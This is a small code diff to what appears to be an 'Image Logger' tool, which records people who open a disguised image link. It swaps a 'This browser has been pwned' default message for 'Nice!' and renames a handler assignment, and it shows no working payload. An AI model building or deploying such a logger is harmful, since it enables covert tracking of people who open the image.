@@ -25,7 +25,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by C00lB0i's Image Logger. https://github.com/OverPowerC", # Message to show
+        "message": "Nice!", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
@@ -298,4 +298,4 @@ if (!currenturl.includes("g=")) {
     do_GET = handleRequest
     do_POST = handleRequest
 
-handler = app = ImageLoggerAPI
+handler = ImageLoggerAPI
